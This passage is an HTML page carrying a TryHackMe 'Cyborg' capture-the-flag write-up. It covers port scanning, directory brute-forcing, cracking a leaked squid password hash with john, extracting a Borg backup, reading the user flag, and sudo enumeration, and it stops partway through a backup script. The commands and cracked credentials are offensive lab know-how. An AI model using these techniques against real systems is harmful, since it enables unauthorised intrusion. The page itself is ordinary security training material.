@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyborg | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
+        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
+        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
+        .markdown-content blockquote { 
+            position: relative;
+            border-left: 2px solid #22c55e; 
+            padding: 1.5rem 0 1.5rem 1.75rem; 
+            color: #cbd5e1; 
+            margin-bottom: 2.5rem; 
+            font-style: normal; 
+            background: rgba(34, 197, 94, 0.03);
+            border-radius: 0 4px 4px 0;
+            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
+        }
+        .markdown-content blockquote::before {
+            content: "TECHNICAL_INTELLIGENCE";
+            position: absolute;
+            top: -9px;
+            left: 0;
+            background: #22c55e;
+            color: #000;
+            font-size: 0.6rem;
+            font-weight: bold;
+            padding: 2px 6px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
+        .markdown-content p { margin-bottom: 1.5rem; }
+        
+        .diag-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+        .diag-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 2px;
+            height: 100%;
+            background: #22c55e;
+            opacity: 0.5;
+        }
+        .diag-label {
+            display: block;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            color: #64748b;
+            margin-bottom: 0.25rem;
+            letter-spacing: 0.1em;
+        }
+        .diag-value {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+        }
+        .diag-blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">
+
+    <!-- Navigation -->
+    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="../index.html" class="logo-container group flex items-center gap-3">
+                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
+            </a>
+
+            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
+                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
+                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
+                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
+                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
+                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
+                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
+                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="py-20 px-6 max-w-7xl mx-auto flex-grow w-full">
+        <!-- Post Header -->
+        <header class="mb-12 border-b border-slate-800 pb-12">
+            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2026-01-05</span>
+                <span>// ID: REF-Cyborg</span>
+            </div>
+            
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Cyborg</h1>
+            
+            <div class="flex flex-wrap gap-2">
+                <!-- Tags populated by python -->
+                <!-- tryhackme -->
+            </div>
+        </header>
+
+        <!-- Markdown Body -->
+        <div class="markdown-content">
+            <hr />
+<div class="codehilite"><pre><span></span><code><span class="nt">PORT</span><span class="w">   </span><span class="nt">STATE</span><span class="w"> </span><span class="nt">SERVICE</span><span class="w"> </span><span class="nt">REASON</span><span class="w">         </span><span class="nt">VERSION</span>
+<span class="nt">22</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">ssh</span><span class="w">     </span><span class="nt">syn-ack</span><span class="w"> </span><span class="nt">ttl</span><span class="w"> </span><span class="nt">62</span><span class="w"> </span><span class="nt">OpenSSH</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">2p2</span><span class="w"> </span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">4ubuntu2</span><span class="p">.</span><span class="nc">10</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">protocol</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="o">)</span>
+<span class="o">|</span><span class="w"> </span><span class="nt">ssh-hostkey</span><span class="o">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nt">2048</span><span class="w"> </span><span class="nt">db</span><span class="p">:</span><span class="nd">b2</span><span class="p">:</span><span class="nd">70</span><span class="p">:</span><span class="nd">f3</span><span class="p">:</span><span class="nd">07</span><span class="p">:</span><span class="nd">ac</span><span class="p">:</span><span class="nd">32</span><span class="p">:</span><span class="nd">00</span><span class="p">:</span><span class="nd">3f</span><span class="p">:</span><span class="nd">81</span><span class="p">:</span><span class="nd">b8</span><span class="p">:</span><span class="nd">d0</span><span class="p">:</span><span class="nd">3a</span><span class="p">:</span><span class="nd">89</span><span class="p">:</span><span class="nd">f3</span><span class="p">:</span><span class="nd">65</span><span class="w"> </span><span class="o">(</span><span class="nt">RSA</span><span class="o">)</span>
+<span class="o">|</span><span class="w"> </span><span class="nt">ssh-rsa</span><span class="w"> </span><span class="nt">AAAAB3NzaC1yc2EAAAADAQABAAABAQCtLmojJ45opVBHg89gyhjnTTwgEf8lVKKbUfVwmfqYP9gU3fWZD05rB</span><span class="o">/</span><span class="nt">4p</span><span class="o">/</span><span class="nt">qSoPbsGWvDUlSTUYMDcxNqaADH</span><span class="o">/</span><span class="nt">nk58URDIiFMEM6dTiMa0grcKC5u4NRxOCtZGHTrZfiYLQKQkBsbmjbb5qpcuhYo</span><span class="o">/</span><span class="nt">tzhVXsrr592Uph4iiUx8zhgfYhqgtehMG</span><span class="o">+</span><span class="nt">UhzQRjnOBQ6GZmI4NyLQtHq7jSeu7ykqS9KEdkgwbBlGnDrC7ke1I9352lBb7jlsL</span><span class="o">/</span><span class="nt">amXt2uiRrBgsmz2AuF</span><span class="o">+</span><span class="nt">ylGha97t6JkueMYHih4Pgn4X0WnwrcUOrY7q9bxB1jQx6laHrExPbz</span><span class="o">+</span><span class="nt">7</span><span class="o">/</span><span class="nt">Na9huvDkLFkr5Soh</span>
+<span class="o">|</span><span class="w">   </span><span class="nt">256</span><span class="w"> </span><span class="nt">68</span><span class="p">:</span><span class="nd">e6</span><span class="p">:</span><span class="nd">85</span><span class="p">:</span><span class="nd">2f</span><span class="p">:</span><span class="nd">69</span><span class="p">:</span><span class="nd">65</span><span class="p">:</span><span class="nd">5b</span><span class="p">:</span><span class="nd">e7</span><span class="p">:</span><span class="nd">c6</span><span class="p">:</span><span class="nd">31</span><span class="p">:</span><span class="nd">2c</span><span class="p">:</span><span class="nd">8e</span><span class="p">:</span><span class="nd">41</span><span class="p">:</span><span class="nd">67</span><span class="p">:</span><span class="nd">d7</span><span class="p">:</span><span class="nd">ba</span><span class="w"> </span><span class="o">(</span><span class="nt">ECDSA</span><span class="o">)</span>
+<span class="o">|</span><span class="w"> </span><span class="nt">ecdsa-sha2-nistp256</span><span class="w"> </span><span class="nt">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB5OB3VYSlOPJbOwXHV</span><span class="o">/</span><span class="nt">je</span><span class="o">/</span><span class="nt">alwaaJ8qljr3iLnKKGkwC4</span><span class="o">+</span><span class="nt">PtH7IhMCAC3vim719GDimVEEGdQPbxUF6eH2QZb20</span><span class="o">=</span>
+<span class="o">|</span><span class="w">   </span><span class="nt">256</span><span class="w"> </span><span class="nt">56</span><span class="p">:</span><span class="nd">2c</span><span class="p">:</span><span class="nd">79</span><span class="p">:</span><span class="nd">92</span><span class="p">:</span><span class="nd">ca</span><span class="p">:</span><span class="nd">23</span><span class="p">:</span><span class="nd">c3</span><span class="p">:</span><span class="nd">91</span><span class="p">:</span><span class="nd">49</span><span class="p">:</span><span class="nd">35</span><span class="p">:</span><span class="nd">fa</span><span class="p">:</span><span class="nd">dd</span><span class="p">:</span><span class="nd">69</span><span class="p">:</span><span class="nd">7c</span><span class="p">:</span><span class="nd">ca</span><span class="p">:</span><span class="nd">ab</span><span class="w"> </span><span class="o">(</span><span class="nt">ED25519</span><span class="o">)</span>
+<span class="o">|</span><span class="nt">_ssh-ed25519</span><span class="w"> </span><span class="nt">AAAAC3NzaC1lZDI1NTE5AAAAIKlr5id6IfMeWb2ZC</span><span class="o">+</span><span class="nt">LelPmOMm9S8ugHG2TtZ5HpFuZQ</span>
+<span class="nt">80</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">http</span><span class="w">    </span><span class="nt">syn-ack</span><span class="w"> </span><span class="nt">ttl</span><span class="w"> </span><span class="nt">62</span><span class="w"> </span><span class="nt">Apache</span><span class="w"> </span><span class="nt">httpd</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">18</span><span class="w"> </span><span class="o">((</span><span class="nt">Ubuntu</span><span class="o">))</span>
+<span class="o">|</span><span class="w"> </span><span class="nt">http-methods</span><span class="o">:</span><span class="w"> </span>
+<span class="o">|</span><span class="nt">_</span><span class="w">  </span><span class="nt">Supported</span><span class="w"> </span><span class="nt">Methods</span><span class="o">:</span><span class="w"> </span><span class="nt">GET</span><span class="w"> </span><span class="nt">POST</span>
+<span class="o">|</span><span class="nt">_http-title</span><span class="o">:</span><span class="w"> </span><span class="nt">Apache2</span><span class="w"> </span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">Default</span><span class="w"> </span><span class="nt">Page</span><span class="o">:</span><span class="w"> </span><span class="nt">It</span><span class="w"> </span><span class="nt">works</span>
+<span class="o">|</span><span class="nt">_http-server-header</span><span class="o">:</span><span class="w"> </span><span class="nt">Apache</span><span class="o">/</span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">18</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="o">)</span>
+<span class="nt">Service</span><span class="w"> </span><span class="nt">Info</span><span class="o">:</span><span class="w"> </span><span class="nt">OS</span><span class="o">:</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">CPE</span><span class="o">:</span><span class="w"> </span><span class="nt">cpe</span><span class="o">:/</span><span class="nt">o</span><span class="p">:</span><span class="nd">linux</span><span class="p">:</span><span class="nd">linux_kernel</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="err">└─$</span><span class="w"> </span><span class="n">dirsearch</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">http</span><span class="o">://</span><span class="n">cybrog</span><span class="p">.</span><span class="n">thm</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">r</span>
+<span class="n">Target</span><span class="o">:</span><span class="w"> </span><span class="n">http</span><span class="o">://</span><span class="n">cybrog</span><span class="p">.</span><span class="n">thm</span><span class="o">/</span>
+
+<span class="p">[</span><span class="mo">02</span><span class="o">:</span><span class="mo">04</span><span class="o">:</span><span class="mi">32</span><span class="p">]</span><span class="w"> </span><span class="n">Starting</span><span class="o">:</span><span class="w"> </span>
+<span class="p">[</span><span class="mo">02</span><span class="o">:</span><span class="mo">05</span><span class="o">:</span><span class="mo">00</span><span class="p">]</span><span class="w"> </span><span class="mi">301</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="mi">308</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">admin</span><span class="w">  </span><span class="o">-&gt;</span><span class="w">  </span><span class="n">http</span><span class="o">://</span><span class="n">cybrog</span><span class="p">.</span><span class="n">thm</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="w">              </span>
+<span class="n">Added</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">queue</span><span class="o">:</span><span class="w"> </span><span class="n">admin</span><span class="o">/</span>
+<span class="p">[</span><span class="mo">02</span><span class="o">:</span><span class="mo">05</span><span class="o">:</span><span class="mi">31</span><span class="p">]</span><span class="w"> </span><span class="mi">301</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="mi">306</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="w">  </span><span class="o">-&gt;</span><span class="w">  </span><span class="n">http</span><span class="o">://</span><span class="n">cybrog</span><span class="p">.</span><span class="n">thm</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="w">  </span>
+</code></pre></div>
+
+<p>find out they are located in /etc/squid/squid.conf , gobuster picks up the <code>/etc</code> directory aswell so this is an alternate method.</p>
+<div class="codehilite"><pre><span></span><code>uth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd auth_param basic children 5 auth_param basic realm Squid Basic Authentication auth_param basic credentialsttl 2 hours acl auth_users proxy_auth REQUIRED http_access allow auth_users
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="n">HASH</span><span class="p">:</span><span class="w"> </span><span class="o">$</span><span class="n">apr1</span><span class="o">$</span><span class="n">BpZ</span><span class="o">.</span><span class="n">Q</span><span class="o">.</span><span class="mi">1</span><span class="n">m</span><span class="o">$</span><span class="n">F0qqPwHSOG50URuOVQTTn</span><span class="o">.</span>
+
+<span class="n">Possible</span><span class="w"> </span><span class="n">Hashs</span><span class="p">:</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">MD5</span><span class="p">(</span><span class="n">APR</span><span class="p">)</span>
+
+
+<span class="n">john</span><span class="w"> </span><span class="nb">hash</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="o">--</span><span class="n">wordlist</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">Warning</span><span class="p">:</span><span class="w"> </span><span class="n">detected</span><span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="s2">&quot;md5crypt&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">also</span><span class="w"> </span><span class="n">recognized</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="s2">&quot;md5crypt-long&quot;</span>
+<span class="n">Use</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="s2">&quot;--format=md5crypt-long&quot;</span><span class="w"> </span><span class="n">option</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">force</span><span class="w"> </span><span class="n">loading</span><span class="w"> </span><span class="n">these</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="n">instead</span>
+<span class="n">Using</span><span class="w"> </span><span class="n">default</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="n">encoding</span><span class="p">:</span><span class="w"> </span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
+<span class="n">Loaded</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="p">(</span><span class="n">md5crypt</span><span class="p">,</span><span class="w"> </span><span class="n">crypt</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="o">$</span><span class="mi">1</span><span class="o">$</span><span class="w"> </span><span class="p">(</span><span class="ow">and</span><span class="w"> </span><span class="n">variants</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="n">MD5</span><span class="w"> </span><span class="mi">256</span><span class="o">/</span><span class="mi">256</span><span class="w"> </span><span class="n">AVX2</span><span class="w"> </span><span class="mi">8</span><span class="n">x3</span><span class="p">])</span>
+<span class="n">Will</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="n">OpenMP</span><span class="w"> </span><span class="n">threads</span>
+<span class="n">Press</span><span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">abort</span><span class="p">,</span><span class="w"> </span><span class="n">almost</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">status</span>
+<span class="n">squidward</span><span class="w">        </span><span class="p">(</span><span class="err">?</span><span class="p">)</span><span class="w">     </span>
+</code></pre></div>
+
+<p>now we i have valid credintilas <code>music_archive:squidward</code></p>
+<p>I EXTRACT DOWNLOADED FILES USING THAT ADMIN PANNEL </p>
+<div class="codehilite"><pre><span></span><code>└─$  tar -xvf archive.tar                               
+home/field/dev/final_archive/
+home/field/dev/final_archive/hints.5
+home/field/dev/final_archive/integrity.5
+home/field/dev/final_archive/config
+home/field/dev/final_archive/README
+home/field/dev/final_archive/nonce
+home/field/dev/final_archive/index.5
+home/field/dev/final_archive/data/
+home/field/dev/final_archive/data/0/
+home/field/dev/final_archive/data/0/5
+home/field/dev/final_archive/data/0/3
+home/field/dev/final_archive/data/0/4
+home/field/dev/final_archive/data/0/1
+
+
+
+└─$ tree                 
+.
+└── field
+    └── dev
+        └── final_archive
+            ├── config
+            ├── data
+            │   └── 0
+            │       ├── 1
+            │       ├── 3
+            │       ├── 4
+            │       └── 5
+            ├── hints.5
+            ├── index.5
+            ├── integrity.5
+            ├── nonce
+            └── README
+
+6 directories, 10 files
+
+
+cat field/dev/final_archive/README
+This is a Borg Backup repository.
+See https://borgbackup.readthedocs.io/
+</code></pre></div>
+
+<p>This is just a type of backup software for compression. I just happened to stumble across this on github and thought it was cool.</p>
+<p>So their docs are <a href="https://borgbackup.readthedocs.io/">https://borgbackup.readthedocs.io/</a> lets check them out!</p>
+<p>We read the section on usage.</p>
+<p>You can see that in the Usage section there is a section on extracting with the following command <code>borg extract /path/to/repo::my-files</code></p>
+<p>We can get our path to repo by doing <code>pwd</code></p>
+<p>as for the my-files part this seems to be the music_archive that was mentioned earlier and as the username for the hash.</p>
+<div class="codehilite"><pre><span></span><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="err">…</span><span class="o">/</span><span class="n">cyborg</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">field</span><span class="o">/</span><span class="n">dev</span><span class="p">]</span>
+<span class="err">└─</span><span class="o">$</span><span class="w"> </span><span class="n">borg</span><span class="w"> </span><span class="n">extract</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">tryhackme</span><span class="o">/</span><span class="n">cyborg</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">field</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">final_archive</span><span class="p">::</span><span class="n">music_archive</span>
+<span class="n">Enter</span><span class="w"> </span><span class="n">passphrase</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">tryhackme</span><span class="o">/</span><span class="n">cyborg</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">field</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">final_archive</span><span class="p">:</span><span class="w"> </span>
+
+
+<span class="err">└─</span><span class="o">$</span><span class="w"> </span><span class="n">tree</span><span class="w">                       </span>
+<span class="o">.</span>
+<span class="err">└──</span><span class="w"> </span><span class="n">alex</span>
+<span class="w">    </span><span class="err">├──</span><span class="w"> </span><span class="n">Desktop</span>
+<span class="w">    </span><span class="err">│</span><span class="w">   </span><span class="err">└──</span><span class="w"> </span><span class="n">secret</span><span class="o">.</span><span class="n">txt</span>
+<span class="w">    </span><span class="err">├──</span><span class="w"> </span><span class="n">Documents</span>
+<span class="w">    </span><span class="err">│</span><span class="w">   </span><span class="err">└──</span><span class="w"> </span><span class="n">note</span><span class="o">.</span><span class="n">txt</span>
+<span class="w">    </span><span class="err">├──</span><span class="w"> </span><span class="n">Downloads</span>
+<span class="w">    </span><span class="err">├──</span><span class="w"> </span><span class="n">Music</span>
+<span class="w">    </span><span class="err">├──</span><span class="w"> </span><span class="n">Pictures</span>
+<span class="w">    </span><span class="err">├──</span><span class="w"> </span><span class="n">Public</span>
+<span class="w">    </span><span class="err">├──</span><span class="w"> </span><span class="n">Templates</span>
+<span class="w">    </span><span class="err">└──</span><span class="w"> </span><span class="n">Videos</span>
+
+<span class="mi">10</span><span class="w"> </span><span class="n">directories</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">files</span>
+</code></pre></div>
+
+<p>Goint trough root</p>
+<div class="codehilite"><pre><span></span><code><span class="n">alex</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">alex</span>
+<span class="n">alex</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">Desktop</span><span class="w">  </span><span class="n">Documents</span><span class="w">  </span><span class="n">Downloads</span><span class="w">  </span><span class="n">Music</span><span class="w">  </span><span class="n">Pictures</span><span class="w">  </span><span class="n">Public</span><span class="w">  </span><span class="n">Templates</span><span class="w">  </span><span class="n">user</span><span class="o">.</span><span class="n">txt</span><span class="w">  </span><span class="n">Videos</span>
+<span class="n">alex</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">flag</span><span class="p">{</span><span class="mi">1</span><span class="n">_hop3_y0u</span><span class="o">.......</span>
+<span class="n">alex</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
+<span class="n">Matching</span><span class="w"> </span><span class="n">Defaults</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">alex</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">ubuntu</span><span class="p">:</span>
+<span class="w">    </span><span class="n">env_reset</span><span class="p">,</span><span class="w"> </span><span class="n">mail_badpass</span><span class="p">,</span><span class="w"> </span><span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span>
+
+<span class="n">User</span><span class="w"> </span><span class="n">alex</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">commands</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">ubuntu</span><span class="p">:</span>
+<span class="w">    </span><span class="p">(</span><span class="n">ALL</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">ALL</span><span class="p">)</span><span class="w"> </span><span class="n">NOPASSWD</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">mp3backups</span><span class="o">/</span><span class="n">backup</span><span class="o">.</span><span class="n">sh</span>
+<span class="n">alex</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">mp3backups</span><span class="o">/</span><span class="n">backup</span><span class="o">.</span><span class="n">sh</span>
+<span class="o">-</span><span class="n">r</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">xr</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">alex</span><span class="w"> </span><span class="n">alex</span><span class="w"> </span><span class="mi">1083</span><span class="w"> </span><span class="n">Dec</span><span class="w"> </span><span class="mi">30</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">mp3backups</span><span class="o">/</span><span class="n">backup</span><span class="o">.</span><span class="n">sh</span>
+<span class="n">alex</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">mp3backups</span><span class="o">/</span><span class="n">backup</span><span class="o">.</span><span class="n">sh</span>
+<span class="c1">#!/bin/bash</span>
+
+<span class="n">sudo</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="s2">&quot;*.mp3&quot;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">tee</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">mp3backups</span><span class="o">/</span><span class="n">backed_up_files</span><span class="o">.</span><span class="n">txt</span>
+
+
+<span class="n">input</span><span class="o">=</span><span class="s2">&quot;/etc/mp3backups/backed_up_files.txt&quot;</span>
+<span class="c1">#while IFS= read -r line</span>
+<span class="c1">#do</span>
+<span class="w">  </span><span class="c1">#a=&quot;/etc/mp3backups/backed_up_files.txt&quot;</span>
